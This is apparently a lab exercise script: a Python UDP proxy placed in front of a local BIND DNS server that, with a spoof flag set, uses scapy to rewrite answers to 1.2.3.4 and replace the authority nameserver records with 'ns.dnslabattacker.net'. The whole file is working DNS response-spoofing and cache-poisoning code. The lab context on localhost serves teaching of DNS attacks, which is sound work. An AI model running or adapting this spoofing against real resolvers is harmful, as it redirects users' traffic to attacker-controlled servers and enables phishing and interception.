#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
print('port: ',port)
# BIND's port
dns_port = args.dns_port
print('dns_port: ', dns_port)
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

UPD_IP = "127.0.0.1"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UPD_IP, port))

while True:
	data, addr = sock.recvfrom(1024)
	sock.sendto(data, (UPD_IP, dns_port))
	data2, addr2 = sock.recvfrom(1024)
	if not SPOOF:
		sock.sendto(data2, addr)
	else:
		data2 = DNS(data2)
		data2.an.rdata = "1.2.3.4"
		#for i in range(data2.ancount):
		#	data2['DNSRR'][i].rdata = "ns.dnslabattacker.net"
		#print(repr(data2))
		data2.ns['DNSRR'][0].rdata = "ns.dnslabattacker.net"
		data2.ns['DNSRR'][1].rdata = "ns.dnslabattacker.net"
		sock.sendto(bytes(data2), addr)
